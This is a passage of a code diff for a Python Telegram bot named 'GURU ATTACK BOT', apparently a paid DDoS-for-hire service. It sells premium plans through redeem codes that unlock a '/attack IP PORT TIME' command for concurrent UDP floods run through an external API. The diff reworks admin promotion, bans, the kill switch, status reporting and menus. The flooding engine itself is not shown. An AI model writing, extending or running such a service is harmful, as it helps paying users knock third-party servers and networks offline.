-        user_id = user.get('user_id')
-        username = user.get('username', 'N/A')
-        reason = user.get('ban_reason', 'No reason')
-        banned_at = user.get('banned_at')
-        banned_at_str = banned_at.strftime('%Y-%m-%d') if banned_at else 'N/A'
-        text += f"• `{user_id}` - @{username}\n"
-        text += f"  Reason: {reason}\n"
-        text += f"  Banned: {banned_at_str}\n\n"
-    
-    await query.edit_message_text(
-        text[:4000],
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
-    )
-
 async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """List all users with their plan and expiry"""
     query = update.callback_query
     await query.answer()
     
@@ -1535,7 +1185,8 @@ async def owner_kill_switch_callback(update: Update, context: ContextTypes.DEFAU
         await query.answer("Access denied!", show_alert=True)
         return
     
-    attack_manager.stop_all_attacks()
+    for aid in list(attack_manager.active_attacks.keys()):
+        attack_manager.stop_attack(aid)
     
     await query.edit_message_text(
         f"🛑 *KILL SWITCH ACTIVATED*\n\n"
@@ -1552,7 +1203,8 @@ async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Only Owner/Pseudo Owner can use this command!")
         return
     
-    attack_manager.stop_all_attacks()
+    for aid in list(attack_manager.active_attacks.keys()):
+        attack_manager.stop_attack(aid)
     
     await update.message.reply_text(
         f"🛑 *KILL SWITCH ACTIVATED*\n\n"
@@ -1593,15 +1245,19 @@ async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         if level not in ["admin", "pseudo_owner"]:
             await update.message.reply_text("❌ Invalid role! Use: admin or pseudo_owner")
+            context.user_data['awaiting_promote'] = False
             return
         
+        # Get user info
         user = db.get_user(user_id)
         username = user.get('username', 'Unknown') if user else 'Unknown'
         
+        # Add as admin - THIS WILL GIVE THEM PREMIUM ACCESS TOO
         if db.add_admin(user_id, username, level, update.effective_user.id):
             await update.message.reply_text(
                 f"✅ *ADMIN PROMOTED!*\n\n"
-                f"User `{user_id}` is now {level.upper()}!",
+                f"User `{user_id}` is now {level.upper()}!\n"
+                f"They now have premium access automatically.",
                 parse_mode='Markdown'
             )
         else:
@@ -1690,19 +1346,6 @@ async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         db.ban_user(user_id, reason, update.effective_user.id)
-        
-        # Try to notify the banned user
-        try:
-            await application.bot.send_message(
-                user_id,
-                f"🚫 *YOU HAVE BEEN BANNED*\n\n"
-                f"Reason: {reason}\n"
-                f"Banned by: {update.effective_user.first_name}\n\n"
-                f"Contact an admin for appeal."
-            )
-        except:
-            pass
-        
         await update.message.reply_text(
             f"✅ User `{user_id}` banned!\n"
             f"Reason: {reason}",
@@ -1720,9 +1363,7 @@ async def owner_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYP
     await query.answer()
     
     await query.edit_message_text(
-        "✅ *UNBAN USER*\n\n"
-        "Send user ID to unban:\n`123456789`\n\n"
-        "Send /cancel to cancel",
+        "✅ *UNBAN USER*\n\nSend user ID to unban:\n`123456789`\n\nSend /cancel to cancel",
         parse_mode='Markdown'
     )
     context.user_data['awaiting_unban'] = True
@@ -1739,22 +1380,7 @@ async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = int(update.message.text.strip())
         db.unban_user(user_id)
-        
-        # Notify user
-        try:
-            await application.bot.send_message(
-                user_id,
-                f"✅ *YOU HAVE BEEN UNBANNED*\n\n"
-                f"You can now use the bot again.\n"
-                f"Use /start to get started."
-            )
-        except:
-            pass
-        
-        await update.message.reply_text(
-            f"✅ User `{user_id}` unbanned!",
-            parse_mode='Markdown'
-        )
+        await update.message.reply_text(f"✅ User `{user_id}` unbanned!", parse_mode='Markdown')
     except ValueError:
         await update.message.reply_text("❌ Invalid user ID!")
     except Exception as e:
@@ -1797,6 +1423,7 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     code = args[0].upper()
     
+    # Check if user already used a code and plan is still active
     user = db.get_user(user_id)
     if user and user.get('has_used_code'):
         plan, expiry = db.get_user_plan(user_id)
@@ -1830,6 +1457,7 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
         
+        # Verify the user was updated
         verify = db.get_user(user_id)
         logger.info(f"User {user_id} after redeem - Plan: {verify.get('plan') if verify else 'None'}")
         
@@ -1842,46 +1470,51 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ===== STATUS COMMAND =====
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
+    stats = attack_manager.get_stats()
+    users = db.get_all_users()
     
-    # Only admins can see detailed status
-    if db.is_admin(user_id):
-        stats = attack_manager.get_stats()
-        users = db.get_all_users()
-        total_attacks = db.get_total_attacks()
-        
-        await update.message.reply_text(
-            f"📊 *BOT STATUS*\n\n"
-            f"⚡ Active Attacks: {stats['active']}\n"
-            f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
-            f"📈 Total Attacks: {stats['global_total']}\n"
-            f"👥 Total Users: {len(users)}\n"
-            f"💥 All-Time Attacks: {total_attacks}\n"
-            f"🎯 Method: API-ONLY UDP\n"
-            f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
-            f"🌐 Status: ONLINE\n\n"
-            f"📌 /attack IP PORT TIME",
-            parse_mode='Markdown'
-        )
-    else:
-        stats = attack_manager.get_stats()
-        await update.message.reply_text(
-            f"📊 *BOT STATUS*\n\n"
-            f"⚡ Active Attacks: {stats['active']}\n"
-            f"🌐 Status: ONLINE",
-            parse_mode='Markdown'
-        )
+    await update.message.reply_text(
+        f"📊 *BOT STATUS*\n\n"
+        f"⚡ Active: {stats['active']}\n"
+        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
+        f"📈 Total Attacks: {stats['total']}\n"
+        f"👥 Users: {len(users)}\n"
+        f"🎯 Method: API-ONLY UDP\n"
+        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
+        f"🌐 Status: ONLINE\n\n"
+        f"📌 /attack IP PORT TIME",
+        parse_mode='Markdown'
+    )
 
 # ===== BACK =====
 async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    user_id = query.from_user.id
+    user = update.effective_user
+    user_id = user.id
+    is_admin = db.is_admin(user_id)
+    plan, expiry = db.get_user_plan(user_id)
+    
+    keyboard = []
+    if not db.is_banned(user_id):
+        if plan == "premium":
+            keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
+        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
+    
+    if is_admin:
+        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
+        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
+    
+    if db.is_owner_or_pseudo(user_id):
+        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
+    
+    if not is_admin:
+        keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
     
     await query.edit_message_text(
         f"👋 *WELCOME BACK*",
-        reply_markup=Keyboards.main_menu(user_id),
+        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
         parse_mode='Markdown'
     )
 
@@ -1922,9 +1555,6 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
     app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
     app.add_handler(CallbackQueryHandler(process_delete_callback, pattern="^del_"))
-    app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
-    app.add_handler(CallbackQueryHandler(broadcast_confirm, pattern="^broadcast_confirm$"))
-    app.add_handler(CallbackQueryHandler(broadcast_cancel, pattern="^broadcast_cancel$"))
     
     # Owner
     app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
@@ -1935,8 +1565,6 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
     app.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
     app.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
-    app.add_handler(CallbackQueryHandler(owner_attack_logs, pattern="^owner_attack_logs$"))
-    app.add_handler(CallbackQueryHandler(owner_banned_users, pattern="^owner_banned_users$"))
     app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
     
     # Messages
@@ -1944,7 +1572,6 @@ def run_bot():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_promote))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_ban))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_unban))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_broadcast))
     
     loop.run_until_complete(app.initialize())
     loop.run_until_complete(app.start())
@@ -1955,14 +1582,11 @@ def run_bot():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("👑 GURU ATTACK BOT v2.0")
+    print("👑 GURU ATTACK BOT")
     print("⚡ 20x UDP CONCURRENT")
-    print("💎 PREMIUM ONLY (Redeem Code Required)")
     print("📌 API-ONLY UDP - NO FALLBACK")
     print("📌 Live Time Updates in Bot DM")
     print("📌 Real-time Alerts to Admins")
-    print("📌 Broadcast Feature")
-    print("📌 User Management")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
